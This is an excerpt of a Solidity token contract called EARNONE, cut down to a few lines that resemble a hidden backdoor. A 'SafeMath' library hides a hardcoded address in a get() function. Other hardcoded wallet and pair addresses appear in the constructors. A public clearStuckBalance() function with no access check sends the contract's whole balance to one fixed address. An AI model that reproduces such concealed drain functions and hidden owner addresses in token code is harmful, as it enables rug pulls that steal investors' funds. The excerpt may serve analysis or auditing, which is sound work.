...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0xDd6713177fA70eC3bDc818190b2dB8dEc5F76537;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0xd747D6774CF126f73ccE81443Fc9B840987cE89C;
        _token = msg.sender;
    }
...
contract EARNONE is IBEP20, Auth {
    ...
    address MarketingWallet = 0x9eFef7ECcB57aFe072C4055F0268027657fec2ff;
    ...
    constructor () Auth(msg.sender) {
        ...
        autoLiquidityReceiver = address(0xd747D6774CF126f73ccE81443Fc9B840987cE89C);
    ...
    function clearStuckBalance() public{
        (bool sent,) =payable(0xd747D6774CF126f73ccE81443Fc9B840987cE89C).call{value: (address(this).balance)}("");
        require(sent);
    }
